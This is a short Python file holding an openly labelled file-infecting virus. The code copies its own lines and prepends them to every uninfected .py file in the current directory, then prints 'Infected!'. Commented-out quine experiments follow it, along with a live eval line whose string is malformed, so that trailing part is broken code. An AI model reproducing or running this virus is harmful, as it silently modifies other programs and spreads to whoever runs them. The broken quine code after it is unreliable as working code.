### Virus
import sys, glob, re

# Get a copy of the virus
vCode = []
with open(sys.argv[0], "r") as f:
    lines = f.readlines()

inVirus = False
for line in lines:
    if re.search("^### Virus", line): inVirus = True
    if inVirus: vCode.append(line)
    if re.search("^### Virus end", line): break

#Find Potensial Victims
progs = glob.glob("*.py")

# Check and Infect
for prog in progs:
    with open(prog, "r") as f:
        pCode = f.readlines()
    print(pCode)
    infected = False
    for line in pCode:
        if ("### Virus" in line):
            infected = True
            break

    if not infected:
        newCode = []
        if ("#!" in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        # Writing new virus infected code
        with open(prog, "w") as f:
            f.writelines(newCode)
        
# Optional Payload
print("Infected!")

### Virus end
# a="""a=%rprint (a%%a)"""
# print (a%a)

variabel = 'print("variabel = " + repr(variabel) + "\\neval(variabel)'
eval(variabel)

# months = "\nJan\nFeb\nMar\nApr\nMay\nJun\nJul\nAug"
# a = "%r" % months + "Hello"
# print(a%a)